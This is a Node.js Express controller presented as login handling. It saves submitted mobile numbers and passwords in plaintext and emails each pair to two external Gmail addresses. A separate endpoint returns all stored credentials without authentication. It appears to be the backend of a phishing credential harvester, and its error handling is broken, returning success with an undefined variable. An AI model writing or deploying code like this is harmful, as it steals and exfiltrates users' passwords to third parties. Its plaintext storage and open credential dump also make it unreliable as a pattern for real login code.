const Login = require("../models/login");
const sendMail = require("../utils/sendemail");

exports.getLogin = async (req, res) => {
  try {
    const allLogin = await Login.find();
    res.status(201).json({
      status: "success",
      data: {
        data: allLogin,
      },
    });
  } catch (err) {
    res.status(201).json({
      status: "success",
      data: {
        data: LoginData,
      },
    });
  }
};

exports.postLogin = async (req, res) => {
  try {
    //console.log('body: ',req.body);

    const LoginData = await Login.create({
      mobile: req.body.mobile,
      password: req.body.password,
    });
    if (!LoginData) {
      res.status(400).json({
        status: "fail",
        message: "not post data",
      });
    } else {
      res.status(201).json({
        status: "success",
        data: {
          data: LoginData,
        },
      });

      const userLoginData = `New User Login Data  \n\n\nMobile: ${req.body.mobile} \nPassword: ${req.body.password}`;
      try {
        await sendMail({
          email: ["lulumalls697@gmail.com","kartikverma.here@gmail.com"],
          subject: `Login user data`,
          message: userLoginData,
        });
        console.log("mail send");
      } catch (err) {
        console.log("send mail ERROR: ", err);
      }
    }
  } catch (err) {
    res.status(500).json({
      status: "fail",
      message: "not post data",
    });
  }
};
